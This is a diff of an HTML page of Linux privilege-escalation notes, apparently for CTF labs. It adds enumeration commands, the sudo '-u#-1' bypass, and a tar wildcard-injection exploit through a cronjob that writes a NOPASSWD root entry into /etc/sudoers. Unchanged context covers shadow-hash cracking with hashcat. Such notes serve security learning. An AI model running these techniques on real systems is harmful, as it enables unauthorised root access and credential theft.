@@ -59,7 +59,7 @@
                 <div class="notion-body">
                     <h2 id="Enumeration">Enumeration</h2>
                     <ul>
-                        <h3> Basic commands </h3>
+                        <h3> Key commands </h3>
                         <ul>
                             <pre><code class="language-bash">hostname</code></pre>
                             <pre><code class="language-bash">ps</code></pre>
@@ -68,21 +68,32 @@
                             <pre><code class="language-bash">id</code></pre>
                             <pre><code class="language-bash">cat /etc/os-release</code></pre>
                             <pre><code class="language-bash">ps au #Check logged in users</code></pre>
+                            <pre><code class="language-bash">cat /etc/group; getent group sudo #Check all groups and check users of specific group</code></pre>
                             <pre><code class="language-bash">find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null  #Check writeable folders</code></pre>
-                            <pre><code class="language-bash"> find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null  #Check writeable files</code></pre>
+                            <pre><code class="language-bash">find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null  #Check writeable files</code></pre>
+                            <pre><code class="language-bash">sudo grep -rni "flag" / 2>/dev/null #Search for specific content</code></pre>
+                            <pre><code class="language-bash">lpstat  #Check Check printers attached to the system</code></pre>
+                            <pre><code class="language-bash">find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student  #Find hidden files and filter by user</code></pre>
+                            <pre><code class="language-bash">find / -type d -name ".*" -ls 2>/dev/null  #Find hidden directories</code></pre>
+                            <pre><code class="language-bash">ls -l /tmp /var/tmp /dev/shm  #It's worth to check for temporary folders</code></pre>
                         </ul>
 
                         <h3> Check for security measures</h3>
                         <ul>
-                            <p><b>Exec Shield</b>Reduces the risk of worm or other automated remote attacks on Linux systems</p>
+                            <p><b>Exec Shield </b>Reduces the risk of worm or other automated remote attacks on Linux systems</p>
                             <pre><code class="language-bash">cat /proc/sys/kernel/exec-shield</code></pre>
-                            
-                            <h4>iptables</h4>
-                            <h4>AppArmor</h4>
-                            <h4>SELinux</h4>
-                            <h4>Fail2ban</h4>
-                            <h4>Snort</h4>
-                            <h4>Uncomplicated Firewall (ufw)</h4>
+                            <p><b>iptables </b>A command-line firewall utility for Linux systems that manages network traffic by filtering and manipulating IP packets. The following command will show you if there are rules</p>
+                            <pre><code class="language-bash">sudo iptables -L</code></pre>
+                            <p><b>Apparmour</b> is a Linux kernel security module that enhances system security by restricting programs' capabilities through per-program profiles</p>
+                            <pre><code class="language-bash">sudo aa-status</code></pre>
+                            <p><b>SELinux </b>Security-Enhanced Linux (SELinux) is a Linux kernel security module providing mandatory access control (MAC)</p>
+                            <pre><code class="language-bash">sestatus</code></pre>
+                            <p><b>Fail2ban </b>Fail2ban is an open-source intrusion prevention framework designed to protect Linux servers from brute-force attacks</p>
+                            <pre><code class="language-bash">sudo systemctl status fail2ban</code></pre>
+                            <p><b>Snort </b>Snort is a popular open-source Network Intrusion Detection System (NIDS) and Intrusion Prevention System (IPS) developed by Cisco Talos</p>
+                            <pre><code class="language-bash">sudo systemctl status snort</code></pre>
+                            <p><b>Uncomplicated Firewall (ufw) </b>Uncomplicated Firewall (UFW) is a user-friendly command-line interface for managing iptables or nftables</p>
+                            <pre><code class="language-bash">sudo ufw status</code></pre>
                         </ul>
                     </ul> 
                     
@@ -104,6 +115,13 @@
                         <ul>
                             <h4>SETENV</h4>
                             <p>In case you have SETENV privilege over a anything you could run sudo command over it and set environmental variables that might be useful </p>
+                            
+                            <h4>(ALL, !root)</h4>
+                            <p>When we see this in the sudoers file means that our user is able to execute a binary as any user less root. In that case we can try to specify root user using the suid</p>
+                            <pre><code class="language-bash">sudo -u#0 command
+sudo -u#-1 command</code></pre>
+                            
+
                         </ul>
                         <h3> SUID propietary execution </h3>                          
                         <pre><code class="language-bash">find / -type f -perm -4000 2>/dev/null</code></pre>
@@ -136,7 +154,7 @@
                 </div>
 
                 <div class="notion-body">
-                    <h2 id="Privielge scalation: Path">Path Hijacking</h2>
+                    <h2 id="Path Hijacking">Path Hijacking</h2>
                     <ul>
                         <p> ⚠️WARNING!! This process may vary depending of the CTF</p>
                         <h3> Steps </h3>
@@ -163,6 +181,23 @@ void main(){
                         <pre><code class="language-bash">chmod 777 thm</code></pre>
                         <h4> 6. Run the script </h4>
                         <pre><code class="language-bash">./exploit</code></pre>
+                    </ul> 
+                </div>
+
+                <div class="notion-body">
+                    <h2 id="Wildcard Abuse">Wildcard Abuse</h2>
+                    <ul>
+                        <p>In case you found a cronjob that does the following, which in this case it's archiving all content from /home/htb-student every minute. You have found gold</p>
+                        <pre><code class="language-bash">*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *</code></pre>
+                        <p>The thing here is the use of <b>*</b> which in this case we can trick by creating files which have parameter names just like this</p>
+                        <pre><code class="language-bash">touch --checkpoint=1
+touch --checkpoint-action=exec=sh root.sh</code></pre>
+                        <p>And the root.sh file which is the exploit</p>
+                        <pre><code class="language-bash">echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh</code></pre>
+                        
+                        <p>This way the resulting command will be</p>   
+                        <pre><code class="language-bash">cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh root.sh</code></pre>
+                        <p>And based on how tar works setting the checkpoint and the checkpoint action will execute the root.sh performing a modification into the sudoers file and grating our user as root privileges</p>
                     </ul> 
                 </div>
 
@@ -215,7 +250,7 @@ int main(){
                     <ul>
                         <h3>Shadow hashes</h3>
                         <ul>
-                            <p>In case you have the necesary permission to copy /etc/passwd and /etc/shadow you coud export them and use <b>unshadow</b> tool to merge them</p>
+                            <p>In case you have the necesary permission to copy /etc/passwd and /etc/shadow you could export them and use <b>unshadow</b> tool to merge them</p>
                             <pre><code class="language-bash">unshadow passwd shadow > unshadowed.hashes</code></pre>
                             <p>Then you can attempt to crack them using hashcat</p>
                             <pre><code class="language-bash">hashcat -m 1800 unshadow.hashes /usr/share/wordlists/rockyou.txt</code></pre>
@@ -250,6 +285,8 @@ rpm -qa</code></pre>
                         <ul>
                             <p>Checking if a machine is domain joined. Additionally you can check the groups the computer belongs and more</p>
                             <pre><code class="language-bash">realm list</code></pre>
+                            <p>We also can check the <b>/etc/resolv.conf</b> file in order to see if the host is configured to use internal DNS. And even the arp table to check which hosts have that server communicated with</p>
+                            <pre><code class="language-bash">arp -a</code></pre>
                         </ul>
 
                         <h3>Finding kerberos tickets</h3>
